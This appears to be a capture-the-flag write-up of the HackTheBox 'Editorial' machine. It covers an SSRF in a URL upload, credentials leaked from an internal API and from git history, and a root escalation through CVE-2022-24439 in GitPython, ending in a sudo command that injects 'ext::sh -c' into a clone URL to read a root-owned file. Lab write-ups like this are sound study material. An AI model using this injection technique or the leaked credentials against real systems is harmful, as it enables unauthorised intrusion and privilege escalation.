---
description: Linux 🔮 Easy
cover: https://i.pinimg.com/564x/a3/eb/1e/a3eb1e5d87229ecdea29bfcd04453123.jpg
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Editorial

## Recon

### Nmap

```
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.30s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 17 09:06:55 2024 -- 1 IP address (1 host up) scanned in 2296.30 seconds
```

Nothing is interesting in Nmap report&#x20;

### Web app

<figure><img src="../../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

This device's website allows us to access two places: <mark style="color:red;">**`/about`**</mark> and <mark style="color:red;">**`/upload`**</mark>

<figure><img src="../../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

Navigate to <mark style="color:red;">**`/upload`**</mark> endpoint:&#x20;

<figure><img src="../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

This section allows interaction with the web application. We can upload a book cover using a URL, which could be a potential surface for a classic [**SSRF**](#user-content-fn-1)[^1] attack. Alternatively, we could upload local files to attempt some RCEs by bypassing the WAF:

<figure><img src="../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

## Dev

As we know it is quite similar to [**SSRF**](#user-content-fn-2)[^2] vuln and to check more clearly we can try the following

<figure><img src="../../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

But this value is always changing

There is the same when you upload the file via Python server

But when I try using <mark style="color:red;">**`http://127.0.0.1`**</mark> there is <mark style="color:red;">**`/static/images`**</mark> instead of <mark style="color:red;">**`/static/uploads`**</mark>

This will have many possibilities (e.g. different ports), so I used Burp Intruder to brute force these ports

And make the filter is <mark style="color:red;">**`/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg`**</mark>

After we have finished running we can see port 5000 return different results. Let's see the response from port 5000.

<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

Navigate to that endpoint and we can download that file

```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

Port 5000 is frequently utilized for local development servers, especially by Flask (a Python web framework). The response displays JSON data that outlines several API endpoints, including their methods and descriptions. This suggests a RESTful API server that offers clients structured access to various resources.

By that result, we know that local port 5000 has an API endpoint

<figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```json
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```
{% endcode %}

&#x20;Then use the credential <mark style="color:red;">**`dev:dev080217_devAPI!@`**</mark> to SSH login the machine and take the user flag:

<figure><img src="../../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

## Prod

From <mark style="color:red;">**`/home`**</mark>, we can find another user: <mark style="color:red;">**`prod`**</mark>

There is 1 apps folder in <mark style="color:red;">**`dev`**</mark> user. I realized there was a <mark style="color:red;">**`.git`**</mark> file in there

<figure><img src="../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

We can use git log to show a list of all the commits made to a repository.

<figure><img src="../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

We can check all the logs using git show, and the 4th one contains important information for the app

<figure><img src="../../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

## Root

Now we can switch to user prod with creds <mark style="color:red;">**`prod:080217_Producti0n_2023!@`**</mark>, and check sudo privilege:

<figure><img src="../../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

We can see that prod can run a file with root privileges

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])

```

The script is designed to clone a Git repository into a specified directory on a system, using the <mark style="color:red;">**`gitpython`**</mark> library—a Python library that allows for programmatic interaction with Git repositories. The focus here is on the last part of the script:

* **URL to Clone**: The script takes the first command-line argument as the repository URL to clone, which represents an attack vector we can manipulate.
* **Repository Initialization**: The script initializes a new bare repository in the current directory. In Git, a bare repository lacks a working directory, making it ideal for server-side use where a checked-out codebase isn't needed.
* **Cloning**: The script uses the <mark style="color:red;">**`clone_from`**</mark> method from <mark style="color:red;">**`gitpython`**</mark> to clone the repository from the provided URL into a subdirectory named 'new\_changes' within the current directory. It also sets a specific Git configuration option (<mark style="color:red;">**`protocol.ext.allow=always`**</mark>) using <mark style="color:red;">**`multi_option`**</mark> .This option permits certain Git protocols that might otherwise be disabled.

By checking the GitPython version via  <mark style="color:red;">**`pip3 list`**</mark> we can see that it is the version <mark style="color:red;">**`3.1.29`**</mark>. A Google search reveals that this version is associated with [**CVE-2022-24439**](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858), which is susceptible to Remote Code Execution (RCE) due to improper validation of user input. This vulnerability allows the injection of maliciously crafted remote URLs into the clone command because the library makes external 'git' calls without adequately sanitizing input arguments. This vulnerability is particularly relevant when the 'ext' transport protocol is enabled.

This script directly passes a command-line argument <mark style="color:red;">**`sys.argv[1]`**</mark>to the <mark style="color:red;">**`clone_from`**</mark> method without any sanitization or validation. Additionally, by allowing all protocols under the configuration <mark style="color:red;">**`protocol.ext.allow=always`**</mark>, it opens up the possibility of injecting a malicious URL or appending commands that the system shell would execute.

Trying PoC:&#x20;

<figure><img src="../../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

Exploit:&#x20;

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'
```

<figure><img src="../../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

[^1]: Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.

    In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems. This could leak sensitive data, such as authorization credentials.

[^2]: Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.

    In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems. This could leak sensitive data, such as authorization credentials.
